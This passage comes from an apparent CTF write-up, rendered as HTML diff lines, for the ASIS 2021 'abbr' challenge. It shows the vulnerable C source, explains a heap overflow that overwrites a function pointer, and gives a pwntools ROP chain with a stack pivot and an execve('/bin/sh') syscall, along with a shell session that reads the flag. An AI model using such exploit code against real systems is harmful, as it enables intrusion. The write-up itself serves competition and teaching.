class="line"></span><br><span class="line">  <span class="comment">/* Replace all abbreviations */</span></span><br><span class="line">  <span class="keyword">for</span> (p = text; *p; ++p) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(rules) / <span class="keyword">sizeof</span>(Rule); i++) &#123;</span><br><span class="line">      r = &amp;rules[i];</span><br><span class="line">      alen = <span class="built_in">strlen</span>(r-&gt;a);</span><br><span class="line">      blen = <span class="built_in">strlen</span>(r-&gt;b);</span><br><span class="line">      <span class="keyword">if</span> (strncasecmp(p, r-&gt;a, alen) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// i.e &quot;i&#x27;m pwn noob.&quot; --&gt; &quot;i&#x27;m pwn XXnoob.&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (q = end; q &gt; p; --q)</span><br><span class="line">          *(q+blen-alen) = *q;</span><br><span class="line">        <span class="comment">// Update end</span></span><br><span class="line">        end += blen-alen;</span><br><span class="line">        *(end+<span class="number">1</span>) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// i.e &quot;i&#x27;m pwn XXnoob.&quot; --&gt; &quot;i&#x27;m pwn newbie.&quot;</span></span><br><span class="line">        <span class="built_in">memcpy</span>(p, r-&gt;b, blen);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Translator *<span class="title function_">translator_new</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">  Translator *t;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate region for text */</span></span><br><span class="line">  <span class="type">char</span> *text = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>), size);</span><br><span class="line">  <span class="keyword">if</span> (text == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize translator */</span></span><br><span class="line">  t = (Translator*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Translator));</span><br><span class="line">  t-&gt;text = text;</span><br><span class="line">  t-&gt;size = size;</span><br><span class="line">  t-&gt;translate = english_expand;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">translator_reset</span><span class="params">(Translator *t)</span> &#123;</span><br><span class="line">  <span class="built_in">memset</span>(t-&gt;text, <span class="number">0</span>, t-&gt;size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">  Translator *t = translator_new(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/* Input data */</span></span><br><span class="line">    translator_reset(t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter text: &quot;</span>);</span><br><span class="line">    fgets(t-&gt;text, t-&gt;size, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;text[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Expand abbreviation */</span></span><br><span class="line">    t-&gt;translate(t-&gt;text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %s&quot;</span>, t-&gt;text);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<span class="kt">void</span> <span class="nf">english_expand</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">alen</span><span class="p">,</span> <span class="n">blen</span><span class="p">;</span>
-  <span class="n">Rule</span> <span class="o">*</span><span class="n">r</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">end</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">text</span><span class="p">[</span><span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// pointer to the last character
-</span><span class="c1"></span>
-  <span class="cm">/* Replace all abbreviations */</span>
-  <span class="k">for</span> <span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="o">++</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rules</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Rule</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-      <span class="n">r</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rules</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
-      <span class="n">alen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">);</span>
-      <span class="n">blen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">);</span>
-      <span class="k">if</span> <span class="p">(</span><span class="n">strncasecmp</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">,</span> <span class="n">alen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// i.e &#34;i&#39;m pwn noob.&#34; --&gt; &#34;i&#39;m pwn XXnoob.&#34;
-</span><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="n">q</span> <span class="o">=</span> <span class="n">end</span><span class="p">;</span> <span class="n">q</span> <span class="o">&gt;</span> <span class="n">p</span><span class="p">;</span> <span class="o">--</span><span class="n">q</span><span class="p">)</span>
-          <span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">+</span><span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
-        <span class="c1">// Update end
-</span><span class="c1"></span>        <span class="n">end</span> <span class="o">+=</span> <span class="n">blen</span><span class="o">-</span><span class="n">alen</span><span class="p">;</span>
-        <span class="o">*</span><span class="p">(</span><span class="n">end</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
-        <span class="c1">// i.e &#34;i&#39;m pwn XXnoob.&#34; --&gt; &#34;i&#39;m pwn newbie.&#34;
-</span><span class="c1"></span>        <span class="n">memcpy</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">,</span> <span class="n">blen</span><span class="p">);</span>
-      <span class="p">}</span>
-    <span class="p">}</span>
-  <span class="p">}</span>
-<span class="p">}</span>
+<p>The <code>rules.h</code> looks like this:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *a; <span class="comment">// abbreviated string (i.e &quot;asap&quot;)</span></span><br><span class="line">  <span class="type">char</span> *b; <span class="comment">// expanded string (i.e &quot;as soon as possible&quot;)</span></span><br><span class="line">&#125; Rule;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Why are there so many abbreviations in English!!?? :exploding_head:</span></span><br><span class="line">Rule rules[] =</span><br><span class="line">  &#123;</span><br><span class="line">   &#123;.a=<span class="string">&quot;2f4u&quot;</span>, .b=<span class="string">&quot;too fast for you&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;4yeo&quot;</span>, .b=<span class="string">&quot;for your eyes only&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fyeo&quot;</span>, .b=<span class="string">&quot;for your eyes only&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aamof&quot;</span>, .b=<span class="string">&quot;as a matter of fact&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;afaik&quot;</span>, .b=<span class="string">&quot;as far as i know&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;afk&quot;</span>, .b=<span class="string">&quot;away from keyboard&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aka&quot;</span>, .b=<span class="string">&quot;also known as&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;b2k&quot;</span>, .b=<span class="string">&quot;back to keyboard&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;btk&quot;</span>, .b=<span class="string">&quot;back to keyboard&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;btt&quot;</span>, .b=<span class="string">&quot;back to topic&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;btw&quot;</span>, .b=<span class="string">&quot;by the way&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;b/c&quot;</span>, .b=<span class="string">&quot;because&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;c&amp;p&quot;</span>, .b=<span class="string">&quot;copy and paste&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;cys&quot;</span>, .b=<span class="string">&quot;check your settings&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;diy&quot;</span>, .b=<span class="string">&quot;do it yourself&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;eobd&quot;</span>, .b=<span class="string">&quot;end of business day&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;faq&quot;</span>, .b=<span class="string">&quot;frequently asked questions&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fka&quot;</span>, .b=<span class="string">&quot;formerly known as&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fwiw&quot;</span>, .b=<span class="string">&quot;for what it&#x27;s worth&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fyi&quot;</span>, .b=<span class="string">&quot;for your information&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;jfyi&quot;</span>, .b=<span class="string">&quot;just for your information&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;hf&quot;</span>, .b=<span class="string">&quot;have fun&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;hth&quot;</span>, .b=<span class="string">&quot;hope this helps&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;idk&quot;</span>, .b=<span class="string">&quot;i don&#x27;t know&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;iirc&quot;</span>, .b=<span class="string">&quot;if i remember correctly&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;imho&quot;</span>, .b=<span class="string">&quot;in my humble opinion&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;imo&quot;</span>, .b=<span class="string">&quot;in my opinion&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;imnsho&quot;</span>, .b=<span class="string">&quot;in my not so humble opinion&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;iow&quot;</span>, .b=<span class="string">&quot;in other words&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;itt&quot;</span>, .b=<span class="string">&quot;in this thread&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;dgmw&quot;</span>, .b=<span class="string">&quot;don&#x27;t get me wrong&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;mmw&quot;</span>, .b=<span class="string">&quot;mark my words&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;nntr&quot;</span>, .b=<span class="string">&quot;no need to reply&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;noob&quot;</span>, .b=<span class="string">&quot;newbie&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;noyb&quot;</span>, .b=<span class="string">&quot;none of your business&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;nrn&quot;</span>, .b=<span class="string">&quot;no reply necessary&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;otoh&quot;</span>, .b=<span class="string">&quot;on the other hand&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;rtfm&quot;</span>, .b=<span class="string">&quot;read the fine manual&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;scnr&quot;</span>, .b=<span class="string">&quot;sorry, could not resist&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;sflr&quot;</span>, .b=<span class="string">&quot;sorry for late reply&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tba&quot;</span>, .b=<span class="string">&quot;to be announced&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tbc&quot;</span>, .b=<span class="string">&quot;to be continued&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tia&quot;</span>, .b=<span class="string">&quot;thanks in advance&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tq&quot;</span>, .b=<span class="string">&quot;thank you&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tyvm&quot;</span>, .b=<span class="string">&quot;thank you very much&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tyt&quot;</span>, .b=<span class="string">&quot;take your time&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;ttyl&quot;</span>, .b=<span class="string">&quot;talk to you later&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;wfm&quot;</span>, .b=<span class="string">&quot;works for me&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;wtf&quot;</span>, .b=<span class="string">&quot;what the fuck&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;wrt&quot;</span>, .b=<span class="string">&quot;with regard to&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;ymmd&quot;</span>, .b=<span class="string">&quot;you made my day&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;icymi&quot;</span>, .b=<span class="string">&quot;in case you missed it&quot;</span>&#125;,</span><br><span class="line">   <span class="comment">// pwners abbreviations</span></span><br><span class="line">   &#123;.a=<span class="string">&quot;rop &quot;</span>, .b=<span class="string">&quot;return oriented programming &quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;jop &quot;</span>, .b=<span class="string">&quot;jump oriented programming &quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;cop &quot;</span>, .b=<span class="string">&quot;call oriented programming &quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aar&quot;</span>, .b=<span class="string">&quot;arbitrary address read&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aaw&quot;</span>, .b=<span class="string">&quot;arbitrary address write&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;www&quot;</span>, .b=<span class="string">&quot;write what where&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;oob&quot;</span>, .b=<span class="string">&quot;out of bounds&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;ret2&quot;</span>, .b=<span class="string">&quot;return to &quot;</span>&#125;,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
 
-<span class="n">Translator</span> <span class="o">*</span><span class="nf">translator_new</span><span class="p">(</span><span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
-  <span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">;</span>
+<p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.<br>The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
+<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.<br>An interesting abbreviation is the <code>www</code>, which stands for “write what where” (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.<br>So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
+<h2 id="ROPchain-1"><a href="#ROPchain-1" class="headerlink" title="ROPchain"></a>ROPchain</h2><p>Once that’s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.<br>Lets take a look at the values of the registers when we trigger the function pointer:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi</span><br><span class="line"> RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0</span><br><span class="line"> RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp</span><br><span class="line"> RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi</span><br><span class="line"> RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x49e522 ◂— &#x27;Enter text: &#x27;</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 </span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 </span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 </span><br><span class="line"> RSP  0x7ffdef1b8220 ◂— 0x0</span><br><span class="line"> RIP  0x402036 (main+190) ◂— call   rdx</span><br></pre></td></tr></table></figure>
+<p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.<br>So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn’t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that’s perfect!</p>
+<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that’s enough to get a shell!</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004126e3 : call qword ptr [rax]</span></span><br><span class="line"><span class="comment"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000405121 : xchg eax, esp ; ret</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&quot;wwwwww&quot;</span></span><br><span class="line">pld += <span class="string">b&quot;A&quot;</span>*(<span class="number">0x1000</span>-<span class="number">16</span>) + pwn.p64(<span class="number">0x0000000000405121</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter text: &quot;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000045a8f7 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000404cfe : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004018da : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004017df : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line"></span><br><span class="line">DATA_SEC = <span class="number">0x0000000004c90e0</span></span><br><span class="line">POP_RDI = <span class="number">0x00000000004018da</span></span><br><span class="line">POP_RSI = <span class="number">0x0000000000404cfe</span></span><br><span class="line">POP_RAX = <span class="number">0x000000000045a8f7</span></span><br><span class="line">POP_RDX = <span class="number">0x00000000004017df</span></span><br><span class="line">MOV_PTR_RDI_RSI = <span class="number">0x000000000045684f</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004012e3</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(POP_RDI)</span><br><span class="line">pld += pwn.p64(DATA_SEC)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(MOV_PTR_RDI_RSI)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RAX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br></pre></td></tr></table></figure>
 
-  <span class="cm">/* Allocate region for text */</span>
-  <span class="kt">char</span> <span class="o">*</span><span class="n">text</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span> <span class="n">size</span><span class="p">);</span>
-  <span class="k">if</span> <span class="p">(</span><span class="n">text</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<p>We launch the script with the right arguments and we correctly pop a shell!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 </span><br><span class="line">[*] &#x27;/home/nasm/pwn/asis2021/abbr.d/abbr&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to 168.119.108.148 on port 10010: Done</span><br><span class="line">/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=999(pwn) gid=999(pwn) groups=999(pwn)</span><br><span class="line">$ ls</span><br><span class="line">chall</span><br><span class="line">flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt</span><br><span class="line">$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt</span><br><span class="line">ASIS&#123;d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n&#125;</span><br></pre></td></tr></table></figure>
 
-  <span class="cm">/* Initialize translator */</span>
-  <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="n">Translator</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Translator</span><span class="p">));</span>
-  <span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
-  <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
-  <span class="n">t</span><span class="o">-&gt;</span><span class="n">translate</span> <span class="o">=</span> <span class="n">english_expand</span><span class="p">;</span>
-
-  <span class="k">return</span> <span class="n">t</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="kt">void</span> <span class="nf">translator_reset</span><span class="p">(</span><span class="n">Translator</span> <span class="o">*</span><span class="n">t</span><span class="p">)</span> <span class="p">{</span>
-  <span class="n">memset</span><span class="p">(</span><span class="n">t</span><span class="o">-&gt;</span><span class="n">text</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
